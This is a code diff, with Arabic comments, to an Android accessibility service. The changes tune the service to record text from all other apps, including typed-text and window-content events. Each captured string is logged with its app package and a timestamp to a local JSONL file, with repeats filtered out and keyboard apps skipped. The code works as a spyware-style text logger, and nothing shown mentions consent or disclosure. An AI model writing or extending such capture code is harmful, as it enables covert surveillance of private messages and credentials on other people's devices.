@@ -14,7 +14,11 @@ import java.util.Locale
 
 class AccessibilityHelper : AccessibilityService() {
 
-    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
+    private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.US)
+    private val dateFmt = SimpleDateFormat("yyyy-MM-dd", Locale.US)
+
+    // تتبع آخر نص مقروء من كل تطبيق — لمنع التكرار
+    private val lastTextByPkg = HashMap<String, String>()
 
     companion object {
         fun isEnabled(context: Context): Boolean {
@@ -31,7 +35,7 @@ class AccessibilityHelper : AccessibilityService() {
             return false
         }
 
-        fun readCapturedTexts(ctx: Context, limit: Int = 200): List<String> {
+        fun readCapturedTexts(ctx: Context, limit: Int = 300): List<String> {
             val result = mutableListOf<String>()
             try {
                 val f = File(ctx.filesDir, "accessibility.jsonl")
@@ -53,19 +57,6 @@ class AccessibilityHelper : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d("AccessibilityHelper", "Service connected")
-        // أرسل إشعار عند التشغيل — مرة وحدة
-        try {
-            val f = File(filesDir, "accessibility.jsonl")
-            java.io.FileOutputStream(f, true).use { fos ->
-                val entry = JSONObject().apply {
-                    put("type", "accessibility_init")
-                    put("time", timeFmt.format(Date()))
-                    put("package", "system")
-                    put("texts", "SERVICE_CONNECTED")
-                }
-                fos.write((entry.toString() + "\n").toByteArray())
-            }
-        } catch (_: Exception) {}
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -73,29 +64,41 @@ class AccessibilityHelper : AccessibilityService() {
         try {
             val pkg = event.packageName?.toString() ?: return
             if (pkg == packageName) return
+            // تجاهل لوحة مفاتيح النظام
+            if (pkg.contains("inputmethod") || pkg.contains("keyboard")) return
 
             val type = event.eventType
+
+            // نستقبل فقط أحداث النصوص المهمة
+            if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
+                type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
+                type != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
+                type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                return
+            }
+
             val texts = mutableListOf<String>()
             for (i in 0 until event.text.size) {
-                val t = event.text[i]?.toString() ?: ""
-                if (t.isNotBlank()) texts.add(t)
-            }
-            // إذا ما في نصوص، جرب contentDescription
-            if (texts.isEmpty()) {
-                val cd = event.contentDescription?.toString()
-                if (!cd.isNullOrBlank()) texts.add(cd)
+                val t = event.text[i]?.toString()?.trim() ?: ""
+                if (t.isNotBlank() && t.length > 1) texts.add(t)
             }
             if (texts.isEmpty()) return
 
-            // خزّن محليًا
+            val combined = texts.joinToString(" | ")
+
+            // ✅ فلترة التكرار: إذا نفس النص من نفس التطبيق — تجاهل
+            val lastKey = lastTextByPkg[pkg]
+            if (lastKey == combined) return
+            lastTextByPkg[pkg] = combined
+
+            // ✅ تخزين
             try {
                 val f = File(filesDir, "accessibility.jsonl")
                 val entry = JSONObject().apply {
                     put("type", "accessibility")
-                    put("time", timeFmt.format(Date()))
+                    put("time", dateFmt.format(Date()) + " " + timeFmt.format(Date()))
                     put("package", pkg)
-                    put("event", type)
-                    put("texts", texts.joinToString(" | "))
+                    put("texts", combined)
                 }
                 java.io.FileOutputStream(f, true).use { fos ->
                     fos.write((entry.toString() + "\n").toByteArray())
